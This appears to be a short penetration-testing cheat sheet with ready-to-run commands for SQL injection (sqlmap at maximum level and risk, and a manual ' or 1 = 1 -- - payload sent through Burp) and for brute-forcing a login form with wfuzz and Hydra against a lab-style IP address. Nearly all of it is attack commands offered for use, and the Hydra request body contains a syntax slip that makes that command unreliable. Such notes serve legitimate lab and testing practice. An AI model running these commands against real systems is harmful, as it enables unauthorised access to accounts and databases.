### Sql Injection

```bash
# capture the login request with burp and save it as login.req
sqlmap -r login.req --level=5 --risk=3 --batch
# manual expoitation
> Capture the request with burp
> The entered paramaters will be url encoded, decode it with <ctrl>+<shift>+<u>
> Enter the payload " ' or 1 = 1 -- - " (simple sql injection payload)
> After changing the payload, url encode it with <ctrl>+<u>
```

###  Login Bruteforce

#### WFuZZ

```bash
# make a login attack (post request)
wfuzz -c -v -z file,wordlist -z file,wordlist -d "username=FUZZ&password=FUZ2Z" --hs incorrect --hs invalid http://10.10.10.10/login.php
```

#### Hydra
```bash
# syntax
# hydra -L userslist -P passwordslist <url> http-post-form login_page:request_body:error_message
hydra -L usernames.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username:^USER^&password=^PASS^&Login=Login:Login Failed"
# login_page = /login.php
# request_body = username:^USER^&password=^PASS^&Login=Login
# error_message = Login Failed
```
